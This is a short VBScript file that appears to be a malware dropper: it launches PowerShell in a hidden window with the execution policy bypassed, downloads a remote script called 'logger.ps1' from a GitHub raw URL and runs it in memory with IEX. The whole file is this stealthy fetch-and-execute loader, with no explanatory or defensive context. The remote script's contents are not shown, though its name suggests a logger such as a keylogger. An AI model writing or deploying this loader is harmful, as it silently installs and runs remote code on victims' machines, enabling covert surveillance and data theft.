Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -w hidden -ep Bypass -Command ""IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MtXTheus1/powershell-tools/main/logger.ps1'))""", 0
